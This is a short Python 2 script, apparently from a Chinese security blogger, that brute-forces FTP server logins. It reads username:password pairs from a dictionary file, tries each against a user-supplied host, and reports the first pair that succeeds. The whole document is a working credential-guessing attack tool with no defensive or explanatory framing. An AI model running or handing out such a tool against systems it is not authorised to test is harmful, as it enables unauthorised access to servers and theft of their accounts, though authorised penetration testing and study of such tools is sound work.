#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/13
# Created by 冰河
# Description 利用用户名密码对字典暴力爆破FTP服务器
#             字典中的每一行格式为:
#                   用户名:密码
#                   用户名:密码
# 博客 https://blog.csdn.net/l1028386804

import ftplib

#暴力破解FTP用户名和密码
def bruteLogin(hostname, passwdFile):
    pf = open(passwdFile, 'r')
    for line in pf.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying: " + username + "/" + password
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + username + "/" + password
            ftp.quit()
            return (username, password)
        except Exception, e:
            pass

    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)

#主函数
def main():
    hostname = raw_input("Please Input HostName Or IP: ")
    while not hostname:
        hostname = raw_input("Please Input HostName Or IP: ")

    passwdFile = raw_input("Please Input The Username:Password File Path: ")
    while not passwdFile:
        passwdFile = raw_input("Please Input The Username:Password File Path: ")

    bruteLogin(hostname, passwdFile)

if __name__ == '__main__':
    main()
